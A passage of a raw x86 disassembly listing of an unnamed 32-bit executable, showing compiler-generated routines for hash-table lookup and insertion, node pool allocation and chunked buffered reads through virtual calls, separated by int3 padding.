  4063f7:	mov    eax,DWORD PTR [eax]
  4063f9:	mov    DWORD PTR [ecx+0x8],eax
  4063fc:	cmp    DWORD PTR [ecx+0x8],0x0
  406400:	push   esi
  406401:	jne    0x40641d
  406403:	mov    esi,DWORD PTR [ecx+0x4]
  406406:	inc    DWORD PTR [ecx+0xc]
  406409:	mov    edx,DWORD PTR [ecx+0xc]
  40640c:	cmp    edx,DWORD PTR [esi+0x8]
  40640f:	jge    0x406424
  406411:	mov    eax,DWORD PTR [esi]
  406413:	mov    eax,DWORD PTR [eax+edx*4]
  406416:	mov    DWORD PTR [ecx+0x8],eax
  406419:	test   eax,eax
  40641b:	je     0x406406
  40641d:	mov    eax,0x1
  406422:	pop    esi
  406423:	ret    
  406424:	xor    eax,eax
  406426:	pop    esi
  406427:	ret    
  406428:	int3   
  406429:	int3   
  40642a:	int3   
  40642b:	int3   
  40642c:	int3   
  40642d:	int3   
  40642e:	int3   
  40642f:	int3   
  406430:	push   ebp
  406431:	mov    ebp,esp
  406433:	mov    eax,DWORD PTR [ebp+0x10]
  406436:	push   esi
  406437:	mov    esi,ecx
  406439:	mov    ecx,DWORD PTR [ebp+0x8]
  40643c:	mov    DWORD PTR [esi+0x260c],0x99
  406446:	mov    DWORD PTR [esi],ecx
  406448:	mov    DWORD PTR [esi+0x8],eax
  40644b:	mov    DWORD PTR [esi+0x4],0x0
  406452:	cmp    eax,0x200
  406457:	jle    0x40645e
  406459:	mov    eax,0x200
  40645e:	imul   eax,eax,0x13
  406461:	mov    DWORD PTR [ebp+0x8],eax
  406464:	mov    edx,DWORD PTR [ecx]
  406466:	lea    eax,[ebp+0x8]
  406469:	push   eax
  40646a:	lea    eax,[esi+0xc]
  40646d:	push   eax
  40646e:	push   0x99
  406473:	call   DWORD PTR [edx+0x4]
  406476:	test   eax,eax
  406478:	je     0x406481
  40647a:	mov    eax,esi
  40647c:	pop    esi
  40647d:	pop    ebp
  40647e:	ret    0xc
  406481:	call   0x402190
  406486:	int3   
  406487:	int3   
  406488:	int3   
  406489:	int3   
  40648a:	int3   
  40648b:	int3   
  40648c:	int3   
  40648d:	int3   
  40648e:	int3   
  40648f:	int3   
  406490:	push   ebp
  406491:	mov    ebp,esp
  406493:	push   ebx
  406494:	push   esi
  406495:	mov    esi,DWORD PTR [ebp+0x8]
  406498:	push   edi
  406499:	mov    edi,esi
  40649b:	mov    ebx,ecx
  40649d:	and    edi,0x800001ff
  4064a3:	jns    0x4064ad
  4064a5:	dec    edi
  4064a6:	or     edi,0xfffffe00
  4064ac:	inc    edi
  4064ad:	mov    eax,DWORD PTR [ebx+0x4]
  4064b0:	cmp    esi,eax
  4064b2:	jl     0x4064bd
  4064b4:	add    eax,0x200
  4064b9:	cmp    esi,eax
  4064bb:	jl     0x4064f6
  4064bd:	mov    eax,DWORD PTR [ebx+0x8]
  4064c0:	sub    esi,edi
  4064c2:	sub    eax,esi
  4064c4:	mov    DWORD PTR [ebx+0x4],esi
  4064c7:	cmp    eax,0x200
  4064cc:	jle    0x4064d3
  4064ce:	mov    eax,0x200
  4064d3:	mov    ecx,DWORD PTR [ebx]
  4064d5:	imul   eax,eax,0x13
  4064d8:	imul   esi,esi,0x13
  4064db:	add    esi,DWORD PTR [ebx+0x260c]
  4064e1:	mov    DWORD PTR [ebp+0x8],eax
  4064e4:	mov    edx,DWORD PTR [ecx]
  4064e6:	lea    eax,[ebp+0x8]
  4064e9:	push   eax
  4064ea:	lea    eax,[ebx+0xc]
  4064ed:	push   eax
  4064ee:	push   esi
  4064ef:	call   DWORD PTR [edx+0x4]
  4064f2:	test   eax,eax
  4064f4:	je     0x406505
  4064f6:	imul   edi,edi,0x13
  4064f9:	lea    eax,[ebx+0xc]
  4064fc:	add    eax,edi
  4064fe:	pop    edi
  4064ff:	pop    esi
  406500:	pop    ebx
  406501:	pop    ebp
  406502:	ret    0x4
  406505:	call   0x402190
  40650a:	int3   
  40650b:	int3   
  40650c:	int3   
  40650d:	int3   
  40650e:	int3   
  40650f:	int3   
  406510:	push   ebp
  406511:	mov    ebp,esp
  406513:	push   ecx
  406514:	mov    eax,DWORD PTR [ebp+0x10]
  406517:	push   esi
  406518:	mov    esi,ecx
  40651a:	mov    ecx,DWORD PTR [ebp+0x8]
  40651d:	push   edi
  40651e:	mov    edi,DWORD PTR [ebp+0xc]
  406521:	mov    DWORD PTR [esi+0x80c],edi
  406527:	mov    DWORD PTR [esi],ecx
  406529:	mov    DWORD PTR [esi+0x8],eax
  40652c:	mov    DWORD PTR [esi+0x4],0x0
  406533:	cmp    eax,0x200
  406538:	jle    0x40653f
  40653a:	mov    eax,0x200
  40653f:	shl    eax,0x2
  406542:	mov    DWORD PTR [ebp+0xc],eax
  406545:	mov    edx,DWORD PTR [ecx]
  406547:	lea    eax,[ebp+0xc]
  40654a:	push   eax
  40654b:	lea    eax,[esi+0xc]
  40654e:	push   eax
  40654f:	push   edi
  406550:	call   DWORD PTR [edx+0x4]
  406553:	test   eax,eax
  406555:	je     0x406560
  406557:	pop    edi
  406558:	mov    eax,esi
  40655a:	pop    esi
  40655b:	pop    ecx
  40655c:	pop    ebp
  40655d:	ret    0xc
  406560:	call   0x402190
  406565:	int3   
  406566:	int3   
  406567:	int3   
  406568:	int3   
  406569:	int3   
  40656a:	int3   
  40656b:	int3   
  40656c:	int3   
  40656d:	int3   
  40656e:	int3   
  40656f:	int3   
  406570:	push   ebp
  406571:	mov    ebp,esp
  406573:	push   ebx
  406574:	push   esi
  406575:	mov    esi,DWORD PTR [ebp+0x8]
  406578:	mov    ebx,esi
  40657a:	push   edi
  40657b:	mov    edi,ecx
  40657d:	and    ebx,0x800001ff
  406583:	jns    0x40658d
  406585:	dec    ebx
  406586:	or     ebx,0xfffffe00
  40658c:	inc    ebx
  40658d:	mov    eax,DWORD PTR [edi+0x4]
  406590:	cmp    esi,eax
  406592:	jl     0x40659d
  406594:	add    eax,0x200
  406599:	cmp    esi,eax
  40659b:	jl     0x4065d6
  40659d:	mov    eax,DWORD PTR [edi+0x8]
  4065a0:	sub    esi,ebx
  4065a2:	sub    eax,esi
  4065a4:	mov    DWORD PTR [edi+0x4],esi
  4065a7:	cmp    eax,0x200
  4065ac:	jle    0x4065b3
  4065ae:	mov    eax,0x200
  4065b3:	mov    ecx,DWORD PTR [edi]
  4065b5:	shl    eax,0x2
  4065b8:	mov    DWORD PTR [ebp+0x8],eax
  4065bb:	mov    edx,DWORD PTR [ecx]
  4065bd:	lea    eax,[ebp+0x8]
  4065c0:	push   eax
  4065c1:	lea    eax,[edi+0xc]
  4065c4:	push   eax
  4065c5:	mov    eax,DWORD PTR [edi+0x80c]
  4065cb:	lea    eax,[eax+esi*4]
  4065ce:	push   eax
  4065cf:	call   DWORD PTR [edx+0x4]
  4065d2:	test   eax,eax
  4065d4:	je     0x4065e3
  4065d6:	lea    eax,[edi+0xc]
  4065d9:	pop    edi
  4065da:	pop    esi
  4065db:	lea    eax,[eax+ebx*4]
  4065de:	pop    ebx
  4065df:	pop    ebp
  4065e0:	ret    0x4
  4065e3:	call   0x402190
  4065e8:	int3   
  4065e9:	int3   
  4065ea:	int3   
  4065eb:	int3   
  4065ec:	int3   
  4065ed:	int3   
  4065ee:	int3   
  4065ef:	int3   
  4065f0:	push   ebp
  4065f1:	mov    ebp,esp
  4065f3:	push   ecx
  4065f4:	mov    eax,DWORD PTR [ebp+0x10]
  4065f7:	push   esi
  4065f8:	mov    esi,ecx
  4065fa:	mov    ecx,DWORD PTR [ebp+0x8]
  4065fd:	push   edi
  4065fe:	mov    edi,DWORD PTR [ebp+0xc]
  406601:	mov    DWORD PTR [esi+0xa0c],edi
  406607:	mov    DWORD PTR [esi],ecx
  406609:	mov    DWORD PTR [esi+0x8],eax
  40660c:	mov    DWORD PTR [esi+0x4],0x0
  406613:	cmp    eax,0x200
  406618:	jle    0x40661f
  40661a:	mov    eax,0x200
  40661f:	lea    eax,[eax+eax*4]
  406622:	mov    DWORD PTR [ebp+0xc],eax
  406625:	mov    edx,DWORD PTR [ecx]
  406627:	lea    eax,[ebp+0xc]
  40662a:	push   eax
  40662b:	lea    eax,[esi+0xc]
  40662e:	push   eax
  40662f:	push   edi
  406630:	call   DWORD PTR [edx+0x4]
  406633:	test   eax,eax
  406635:	je     0x406640
  406637:	pop    edi
  406638:	mov    eax,esi
  40663a:	pop    esi
  40663b:	pop    ecx
  40663c:	pop    ebp
  40663d:	ret    0xc
  406640:	call   0x402190
  406645:	int3   
  406646:	int3   
  406647:	int3   
  406648:	int3   
  406649:	int3   
  40664a:	int3   
  40664b:	int3   
  40664c:	int3   
  40664d:	int3   
  40664e:	int3   
  40664f:	int3   
  406650:	push   esi
  406651:	mov    esi,ecx
  406653:	cmp    DWORD PTR [esi],0x0
  406656:	mov    DWORD PTR [esi+0x4],0x0
  40665d:	je     0x406699
  40665f:	push   edi
  406660:	xor    edi,edi
  406662:	cmp    DWORD PTR [esi+0x8],edi
  406665:	jle    0x406698
  406667:	mov    eax,DWORD PTR [esi]
  406669:	mov    eax,DWORD PTR [eax+edi*4]
  40666c:	test   eax,eax
  40666e:	je     0x406688
  406670:	mov    edx,DWORD PTR ds:0x4223a8
  406676:	mov    ecx,DWORD PTR [eax]
  406678:	mov    DWORD PTR [eax],edx
  40667a:	mov    edx,eax
  40667c:	mov    DWORD PTR ds:0x4223a8,edx
  406682:	mov    eax,ecx
  406684:	test   ecx,ecx
  406686:	jne    0x406676
  406688:	mov    eax,DWORD PTR [esi]
  40668a:	inc    edi
  40668b:	mov    DWORD PTR [eax+edi*4-0x4],0x0
  406693:	cmp    edi,DWORD PTR [esi+0x8]
  406696:	jl     0x406667
  406698:	pop    edi
  406699:	pop    esi
  40669a:	ret    
  40669b:	int3   
  40669c:	int3   
  40669d:	int3   
  40669e:	int3   
  40669f:	int3   
  4066a0:	push   ebp
  4066a1:	mov    ebp,esp
  4066a3:	push   ecx
  4066a4:	push   ebx
  4066a5:	push   esi
  4066a6:	mov    esi,DWORD PTR [ebp+0x8]
  4066a9:	push   edi
  4066aa:	mov    edi,ecx
  4066ac:	push   esi
  4066ad:	mov    eax,DWORD PTR [edi+0xc]
  4066b0:	call   eax
  4066b2:	movzx  eax,ax
  4066b5:	cdq    
  4066b6:	idiv   DWORD PTR [edi+0x8]
  4066b9:	mov    eax,DWORD PTR [edi]
  4066bb:	add    esp,0x4
  4066be:	lea    ebx,[eax+edx*4]
  4066c1:	mov    eax,DWORD PTR [ebx]
  4066c3:	test   eax,eax
  4066c5:	je     0x4066d2
  4066c7:	cmp    DWORD PTR [eax+0x4],esi
  4066ca:	je     0x4066ef
  4066cc:	mov    eax,DWORD PTR [eax]
  4066ce:	test   eax,eax
  4066d0:	jne    0x4066c7
  4066d2:	mov    ecx,DWORD PTR ds:0x4223a8
  4066d8:	test   ecx,ecx
  4066da:	je     0x406702
  4066dc:	mov    eax,DWORD PTR [ecx]
  4066de:	mov    ds:0x4223a8,eax
  4066e3:	xor    eax,eax
  4066e5:	mov    DWORD PTR [ecx],eax
  4066e7:	mov    DWORD PTR [ecx+0x4],eax
  4066ea:	mov    DWORD PTR [ecx+0x8],eax
  4066ed:	jmp    0x40674a
  4066ef:	mov    ecx,DWORD PTR [ebp+0xc]
  4066f2:	mov    DWORD PTR [eax+0x8],ecx
  4066f5:	mov    eax,0x1
  4066fa:	pop    edi
  4066fb:	pop    esi
  4066fc:	pop    ebx
  4066fd:	pop    ecx
  4066fe:	pop    ebp
  4066ff:	ret    0x8
  406702:	mov    eax,ds:0x422b88
  406707:	cmp    eax,0xc
  40670a:	jge    0x406731
  40670c:	cmp    eax,0x4
  40670f:	jb     0x40671e
  406711:	mov    ecx,DWORD PTR ds:0x422b84
  406717:	mov    edx,eax
  406719:	call   0x40cf80
  40671e:	mov    ecx,0x200
  406723:	call   0x40c940
  406728:	mov    edx,eax
  40672a:	mov    eax,0x200
  40672f:	jmp    0x406737
  406731:	mov    edx,DWORD PTR ds:0x422b84
  406737:	sub    eax,0xc
  40673a:	mov    ecx,edx
  40673c:	add    edx,0xc
  40673f:	mov    ds:0x422b88,eax
  406744:	mov    DWORD PTR ds:0x422b84,edx
  40674a:	mov    eax,DWORD PTR [ebp+0xc]
  40674d:	mov    DWORD PTR [ecx+0x4],esi
  406750:	mov    DWORD PTR [ecx+0x8],eax
  406753:	mov    eax,DWORD PTR [ebx]
  406755:	mov    DWORD PTR [ecx],eax
  406757:	mov    DWORD PTR [ebx],ecx
  406759:	inc    DWORD PTR [edi+0x4]
  40675c:	pop    edi
  40675d:	pop    esi
  40675e:	mov    eax,0x1
  406763:	pop    ebx
  406764:	pop    ecx
  406765:	pop    ebp
  406766:	ret    0x8
  406769:	int3   
  40676a:	int3   
  40676b:	int3   
  40676c:	int3   
  40676d:	int3   
  40676e:	int3   
  40676f:	int3   
  406770:	mov    ecx,DWORD PTR ds:0x40e054
  406776:	mov    DWORD PTR ds:0x40e058,0x0
  406780:	test   ecx,ecx
  406782:	je     0x4067d1
  406784:	push   esi
  406785:	xor    esi,esi
  406787:	cmp    DWORD PTR ds:0x40e05c,esi
  40678d:	jle    0x4067d0
  40678f:	nop
  406790:	mov    eax,DWORD PTR [ecx+esi*4]
  406793:	test   eax,eax
  406795:	je     0x4067b8
  406797:	mov    edx,DWORD PTR ds:0x421bb8
  40679d:	lea    ecx,[ecx+0x0]
  4067a0:	mov    ecx,DWORD PTR [eax]
  4067a2:	mov    DWORD PTR [eax],edx
  4067a4:	mov    edx,eax
  4067a6:	mov    DWORD PTR ds:0x421bb8,edx
  4067ac:	mov    eax,ecx
  4067ae:	test   ecx,ecx
  4067b0:	jne    0x4067a0
  4067b2:	mov    ecx,DWORD PTR ds:0x40e054
  4067b8:	mov    DWORD PTR [ecx+esi*4],0x0
  4067bf:	inc    esi
  4067c0:	cmp    esi,DWORD PTR ds:0x40e05c
  4067c6:	jge    0x4067d0
  4067c8:	mov    ecx,DWORD PTR ds:0x40e054
  4067ce:	jmp    0x406790
  4067d0:	pop    esi
  4067d1:	ret    
  4067d2:	int3   
  4067d3:	int3   
  4067d4:	int3   
  4067d5:	int3   
  4067d6:	int3   
  4067d7:	int3   
  4067d8:	int3   
  4067d9:	int3   
  4067da:	int3   
  4067db:	int3   
  4067dc:	int3   
  4067dd:	int3   
  4067de:	int3   
  4067df:	int3   
  4067e0:	push   ebp
  4067e1:	mov    ebp,esp
  4067e3:	sub    esp,0x8
  4067e6:	lea    eax,[ebp-0x4]
  4067e9:	push   esi
  4067ea:	push   edi
  4067eb:	push   eax
  4067ec:	mov    eax,DWORD PTR [ebp+0x8]
  4067ef:	sub    esp,0x8
  4067f2:	mov    ecx,esp
  4067f4:	mov    DWORD PTR [ecx],eax
  4067f6:	mov    ax,WORD PTR [ebp+0xc]
  4067fa:	mov    WORD PTR [ecx+0x4],ax
  4067fe:	mov    al,BYTE PTR [ebp+0xe]
  406801:	mov    BYTE PTR [ecx+0x6],al
  406804:	call   0x406c20
  406809:	test   eax,eax
  40680b:	je     0x40681b
  40680d:	mov    eax,DWORD PTR [ebp-0x4]
  406810:	add    eax,0x4
  406813:	pop    edi
  406814:	pop    esi
  406815:	mov    esp,ebp
  406817:	pop    ebp
  406818:	ret    0x8
  40681b:	mov    edi,DWORD PTR ds:0x421bb8
  406821:	test   edi,edi
  406823:	je     0x40683b
  406825:	mov    eax,DWORD PTR [edi]
  406827:	mov    ds:0x421bb8,eax
  40682c:	xor    eax,eax
  40682e:	mov    DWORD PTR [edi],eax
  406830:	mov    DWORD PTR [edi+0x4],eax
  406833:	mov    DWORD PTR [edi+0x8],eax
  406836:	mov    DWORD PTR [edi+0xc],eax
  406839:	jmp    0x406883
  40683b:	mov    eax,ds:0x422b90
  406840:	cmp    eax,0x10
  406843:	jge    0x40686a
  406845:	cmp    eax,0x4
  406848:	jb     0x406857
  40684a:	mov    ecx,DWORD PTR ds:0x422b8c
  406850:	mov    edx,eax
  406852:	call   0x40cec0
  406857:	mov    ecx,0x200
  40685c:	call   0x40c940
  406861:	mov    ecx,eax
  406863:	mov    eax,0x200
  406868:	jmp    0x406870
  40686a:	mov    ecx,DWORD PTR ds:0x422b8c
  406870:	sub    eax,0x10
  406873:	mov    edi,ecx
  406875:	add    ecx,0x10
  406878:	mov    ds:0x422b90,eax
  40687d:	mov    DWORD PTR ds:0x422b8c,ecx
  406883:	mov    eax,DWORD PTR [ebp+0x8]
  406886:	mov    edx,DWORD PTR [ebp-0x4]
  406889:	mov    DWORD PTR [edi+0x4],eax
  40688c:	mov    cx,WORD PTR [ebp+0xc]
  406890:	mov    WORD PTR [edi+0x8],cx
  406894:	mov    cl,BYTE PTR [ebp+0xe]
  406897:	mov    BYTE PTR [edi+0xa],cl
  40689a:	mov    ecx,DWORD PTR [edx]
  40689c:	mov    DWORD PTR [edi],ecx
  40689e:	mov    DWORD PTR [edx],edi
  4068a0:	inc    DWORD PTR ds:0x40e058
  4068a6:	lea    eax,[edi+0x4]
  4068a9:	pop    edi
  4068aa:	pop    esi
  4068ab:	mov    esp,ebp
  4068ad:	pop    ebp
  4068ae:	ret    0x8
  4068b1:	int3   
  4068b2:	int3   
  4068b3:	int3   
  4068b4:	int3   
  4068b5:	int3   
  4068b6:	int3   
  4068b7:	int3   
  4068b8:	int3   
  4068b9:	int3   
  4068ba:	int3   
  4068bb:	int3   
  4068bc:	int3   
  4068bd:	int3   
  4068be:	int3   
  4068bf:	int3   
  4068c0:	push   ebp
  4068c1:	mov    ebp,esp
  4068c3:	push   ecx
  4068c4:	push   esi
  4068c5:	push   edi
  4068c6:	mov    edi,DWORD PTR ds:0x421bb8
  4068cc:	test   edi,edi
  4068ce:	je     0x4068e6
  4068d0:	mov    eax,DWORD PTR [edi]
  4068d2:	mov    ds:0x421bb8,eax
  4068d7:	xor    eax,eax
  4068d9:	mov    DWORD PTR [edi],eax
  4068db:	mov    DWORD PTR [edi+0x4],eax
  4068de:	mov    DWORD PTR [edi+0x8],eax
  4068e1:	mov    DWORD PTR [edi+0xc],eax
  4068e4:	jmp    0x40692e
  4068e6:	mov    eax,ds:0x422b90
  4068eb:	cmp    eax,0x10
  4068ee:	jge    0x406915
  4068f0:	cmp    eax,0x4
  4068f3:	jb     0x406902
  4068f5:	mov    ecx,DWORD PTR ds:0x422b8c
  4068fb:	mov    edx,eax
  4068fd:	call   0x40cec0
  406902:	mov    ecx,0x200
  406907:	call   0x40c940
  40690c:	mov    ecx,eax
  40690e:	mov    eax,0x200
  406913:	jmp    0x40691b
  406915:	mov    ecx,DWORD PTR ds:0x422b8c
  40691b:	sub    eax,0x10
  40691e:	mov    edi,ecx
  406920:	add    ecx,0x10
  406923:	mov    ds:0x422b90,eax
  406928:	mov    DWORD PTR ds:0x422b8c,ecx
  40692e:	mov    eax,DWORD PTR [ebp+0x8]
  406931:	mov    DWORD PTR [edi+0x4],eax
  406934:	mov    ax,WORD PTR [ebp+0xc]
  406938:	mov    WORD PTR [edi+0x8],ax
  40693c:	mov    al,BYTE PTR [ebp+0xe]
  40693f:	mov    BYTE PTR [edi+0xa],al
  406942:	mov    eax,DWORD PTR [ebp+0x10]
  406945:	mov    DWORD PTR [edi+0xb],eax
  406948:	mov    eax,DWORD PTR [ebp+0x8]
  40694b:	inc    DWORD PTR ds:0x40e058
  406951:	sub    esp,0x8
  406954:	mov    ecx,esp
  406956:	mov    DWORD PTR [ecx],eax
  406958:	mov    ax,WORD PTR [ebp+0xc]
  40695c:	mov    WORD PTR [ecx+0x4],ax
  406960:	mov    al,BYTE PTR [ebp+0xe]
  406963:	mov    BYTE PTR [ecx+0x6],al
  406966:	call   DWORD PTR ds:0x40e060
  40696c:	movzx  eax,ax
  40696f:	cdq    
  406970:	add    esp,0x8
  406973:	idiv   DWORD PTR ds:0x40e05c
  406979:	mov    ecx,DWORD PTR ds:0x40e054
  40697f:	lea    eax,[edi+0x4]
  406982:	mov    ecx,DWORD PTR [ecx+edx*4]
  406985:	mov    DWORD PTR [edi],ecx
  406987:	mov    ecx,DWORD PTR ds:0x40e054
  40698d:	mov    DWORD PTR [ecx+edx*4],edi
  406990:	pop    edi
  406991:	pop    esi
  406992:	pop    ecx
  406993:	pop    ebp
  406994:	ret    0xc
  406997:	int3   
  406998:	int3   
  406999:	int3   
  40699a:	int3   
  40699b:	int3   
  40699c:	int3   
  40699d:	int3   
  40699e:	int3   
  40699f:	int3   
  4069a0:	push   esi
  4069a1:	mov    esi,ecx
  4069a3:	cmp    DWORD PTR [esi],0x0
  4069a6:	mov    DWORD PTR [esi+0x4],0x0
  4069ad:	je     0x4069e9
  4069af:	push   edi
  4069b0:	xor    edi,edi
  4069b2:	cmp    DWORD PTR [esi+0x8],edi
  4069b5:	jle    0x4069e8
  4069b7:	mov    eax,DWORD PTR [esi]
  4069b9:	mov    eax,DWORD PTR [eax+edi*4]
  4069bc:	test   eax,eax
  4069be:	je     0x4069d8
  4069c0:	mov    edx,DWORD PTR ds:0x4213a8
  4069c6:	mov    ecx,DWORD PTR [eax]
  4069c8:	mov    DWORD PTR [eax],edx
  4069ca:	mov    edx,eax
  4069cc:	mov    DWORD PTR ds:0x4213a8,edx
  4069d2:	mov    eax,ecx
  4069d4:	test   ecx,ecx
  4069d6:	jne    0x4069c6
  4069d8:	mov    eax,DWORD PTR [esi]
  4069da:	inc    edi
  4069db:	mov    DWORD PTR [eax+edi*4-0x4],0x0
  4069e3:	cmp    edi,DWORD PTR [esi+0x8]
  4069e6:	jl     0x4069b7
  4069e8:	pop    edi
  4069e9:	pop    esi
  4069ea:	ret    
  4069eb:	int3   
  4069ec:	int3   
  4069ed:	int3   
  4069ee:	int3   
  4069ef:	int3   
  4069f0:	push   ebp
  4069f1:	mov    ebp,esp
  4069f3:	push   esi
  4069f4:	push   edi
  4069f5:	mov    edi,DWORD PTR [ebp+0x8]
  4069f8:	mov    esi,ecx
  4069fa:	push   edi
  4069fb:	mov    eax,DWORD PTR [esi+0xc]
  4069fe:	call   eax
  406a00:	movzx  eax,ax
  406a03:	cdq    
  406a04:	idiv   DWORD PTR [esi+0x8]
  406a07:	mov    eax,DWORD PTR [esi]
  406a09:	add    esp,0x4
  406a0c:	mov    eax,DWORD PTR [eax+edx*4]
  406a0f:	test   eax,eax
  406a11:	je     0x406a1e
  406a13:	cmp    DWORD PTR [eax+0x4],edi
  406a16:	je     0x406a26
  406a18:	mov    eax,DWORD PTR [eax]
  406a1a:	test   eax,eax
  406a1c:	jne    0x406a13
  406a1e:	pop    edi
  406a1f:	xor    eax,eax
  406a21:	pop    esi
  406a22:	pop    ebp
  406a23:	ret    0x8
  406a26:	mov    ecx,DWORD PTR [eax+0x8]
  406a29:	mov    eax,DWORD PTR [ebp+0xc]
  406a2c:	pop    edi
  406a2d:	mov    DWORD PTR [eax],ecx
  406a2f:	mov    eax,0x1
  406a34:	pop    esi
  406a35:	pop    ebp
  406a36:	ret    0x8
  406a39:	int3   
  406a3a:	int3   
  406a3b:	int3   
  406a3c:	int3   
  406a3d:	int3   
  406a3e:	int3   
  406a3f:	int3   
  406a40:	push   ebp
  406a41:	mov    ebp,esp
  406a43:	push   ecx
  406a44:	push   ebx
  406a45:	push   esi
  406a46:	mov    esi,DWORD PTR [ebp+0x8]
  406a49:	push   edi
  406a4a:	mov    edi,DWORD PTR ds:0x40e418
  406a50:	push   esi
  406a51:	mov    eax,DWORD PTR [edi+0xc]
  406a54:	call   eax
  406a56:	movzx  eax,ax
  406a59:	cdq    
  406a5a:	idiv   DWORD PTR [edi+0x8]
  406a5d:	mov    eax,DWORD PTR [edi]
  406a5f:	add    esp,0x4
  406a62:	lea    ebx,[eax+edx*4]
  406a65:	mov    eax,DWORD PTR [ebx]
  406a67:	test   eax,eax
  406a69:	je     0x406a7b
  406a6b:	jmp    0x406a70
  406a6d:	lea    ecx,[ecx+0x0]
  406a70:	cmp    DWORD PTR [eax+0x4],esi
  406a73:	je     0x406a98
  406a75:	mov    eax,DWORD PTR [eax]
  406a77:	test   eax,eax
  406a79:	jne    0x406a70
  406a7b:	mov    ecx,DWORD PTR ds:0x4213a8
  406a81:	test   ecx,ecx
  406a83:	je     0x406aac
  406a85:	mov    eax,DWORD PTR [ecx]
  406a87:	mov    ds:0x4213a8,eax
  406a8c:	xor    eax,eax
  406a8e:	mov    DWORD PTR [ecx],eax
  406a90:	mov    DWORD PTR [ecx+0x4],eax
  406a93:	mov    DWORD PTR [ecx+0x8],eax
  406a96:	jmp    0x406af4
  406a98:	mov    ecx,DWORD PTR [ebp+0xc]
  406a9b:	mov    DWORD PTR [eax+0x8],ecx
  406a9e:	mov    eax,0x1
  406aa3:	pop    edi
  406aa4:	pop    esi
  406aa5:	pop    ebx
  406aa6:	mov    esp,ebp
  406aa8:	pop    ebp
  406aa9:	ret    0x8
  406aac:	mov    eax,ds:0x422b98
  406ab1:	cmp    eax,0xc
  406ab4:	jge    0x406adb
  406ab6:	cmp    eax,0x4
  406ab9:	jb     0x406ac8
  406abb:	mov    ecx,DWORD PTR ds:0x422b94
  406ac1:	mov    edx,eax
  406ac3:	call   0x40ce00
  406ac8:	mov    ecx,0x200
  406acd:	call   0x40c940
  406ad2:	mov    edx,eax
  406ad4:	mov    eax,0x200
  406ad9:	jmp    0x406ae1
  406adb:	mov    edx,DWORD PTR ds:0x422b94
  406ae1:	sub    eax,0xc
  406ae4:	mov    ecx,edx
  406ae6:	add    edx,0xc
  406ae9:	mov    ds:0x422b98,eax
  406aee:	mov    DWORD PTR ds:0x422b94,edx
  406af4:	mov    eax,DWORD PTR [ebp+0xc]
  406af7:	mov    DWORD PTR [ecx+0x4],esi
  406afa:	mov    DWORD PTR [ecx+0x8],eax
  406afd:	mov    eax,DWORD PTR [ebx]
  406aff:	mov    DWORD PTR [ecx],eax
  406b01:	mov    DWORD PTR [ebx],ecx
  406b03:	inc    DWORD PTR [edi+0x4]
  406b06:	pop    edi
  406b07:	pop    esi
  406b08:	mov    eax,0x1
  406b0d:	pop    ebx
  406b0e:	mov    esp,ebp
  406b10:	pop    ebp
  406b11:	ret    0x8
  406b14:	int3   
  406b15:	int3   
  406b16:	int3   
  406b17:	int3   
  406b18:	int3   
  406b19:	int3   
  406b1a:	int3   
  406b1b:	int3   
  406b1c:	int3   
  406b1d:	int3   
  406b1e:	int3   
  406b1f:	int3   
  406b20:	push   ebp
  406b21:	mov    ebp,esp
  406b23:	push   ecx
  406b24:	push   ebx
  406b25:	mov    ebx,DWORD PTR ds:0x40e414
  406b2b:	push   esi
  406b2c:	push   edi
  406b2d:	mov    edi,DWORD PTR ds:0x4213a8
  406b33:	test   edi,edi
  406b35:	je     0x406b4a
  406b37:	mov    eax,DWORD PTR [edi]
  406b39:	mov    ds:0x4213a8,eax
  406b3e:	xor    eax,eax
  406b40:	mov    DWORD PTR [edi],eax
  406b42:	mov    DWORD PTR [edi+0x4],eax
  406b45:	mov    DWORD PTR [edi+0x8],eax
  406b48:	jmp    0x406b92
  406b4a:	mov    eax,ds:0x422b98
  406b4f:	cmp    eax,0xc
  406b52:	jge    0x406b79
  406b54:	cmp    eax,0x4
  406b57:	jb     0x406b66
  406b59:	mov    ecx,DWORD PTR ds:0x422b94
  406b5f:	mov    edx,eax
  406b61:	call   0x40ce00
  406b66:	mov    ecx,0x200
  406b6b:	call   0x40c940
  406b70:	mov    ecx,eax
  406b72:	mov    eax,0x200
  406b77:	jmp    0x406b7f
  406b79:	mov    ecx,DWORD PTR ds:0x422b94
  406b7f:	sub    eax,0xc
  406b82:	mov    edi,ecx
  406b84:	add    ecx,0xc
  406b87:	mov    ds:0x422b98,eax
  406b8c:	mov    DWORD PTR ds:0x422b94,ecx
  406b92:	mov    ecx,DWORD PTR [ebp+0x8]
  406b95:	mov    eax,DWORD PTR [ebp+0xc]
  406b98:	mov    DWORD PTR [edi+0x4],ecx
  406b9b:	mov    DWORD PTR [edi+0x8],eax
  406b9e:	mov    eax,DWORD PTR [ebx+0xc]
  406ba1:	inc    DWORD PTR [ebx+0x4]
  406ba4:	push   ecx
  406ba5:	call   eax
  406ba7:	movzx  eax,ax
  406baa:	add    esp,0x4
  406bad:	cdq    
  406bae:	idiv   DWORD PTR [ebx+0x8]
  406bb1:	mov    ecx,DWORD PTR [ebx]
  406bb3:	lea    eax,[edi+0x4]
  406bb6:	mov    ecx,DWORD PTR [ecx+edx*4]
  406bb9:	mov    DWORD PTR [edi],ecx
  406bbb:	mov    ecx,DWORD PTR [ebx]
  406bbd:	mov    DWORD PTR [ecx+edx*4],edi
  406bc0:	pop    edi
  406bc1:	pop    esi
  406bc2:	pop    ebx
  406bc3:	mov    esp,ebp
  406bc5:	pop    ebp
  406bc6:	ret    0x8
  406bc9:	int3   
  406bca:	int3   
  406bcb:	int3   
  406bcc:	int3   
  406bcd:	int3   
  406bce:	int3   
  406bcf:	int3   
  406bd0:	push   ebp
  406bd1:	mov    ebp,esp
  406bd3:	sub    esp,0x8
  406bd6:	push   esi
  406bd7:	mov    esi,DWORD PTR [ebp+0x8]
  406bda:	mov    DWORD PTR [ebp-0x4],0x0
  406be1:	cmp    esi,edx
  406be3:	ja     0x406be7
  406be5:	mov    esi,edx
  406be7:	mov    eax,DWORD PTR [ecx]
  406be9:	mov    DWORD PTR [ecx+0x4],eax
  406bec:	lea    eax,[ebp-0x4]
  406bef:	push   eax
  406bf0:	lea    eax,[esi+esi*1]
  406bf3:	push   eax
  406bf4:	call   0x406f80
  406bf9:	test   eax,eax
  406bfb:	je     0x406c05
  406bfd:	mov    eax,DWORD PTR [ebp-0x4]
  406c00:	pop    esi
  406c01:	mov    esp,ebp
  406c03:	pop    ebp
  406c04:	ret    
  406c05:	push   0x0
  406c07:	mov    edx,0x4010c0
  406c0c:	mov    ecx,0x5e5
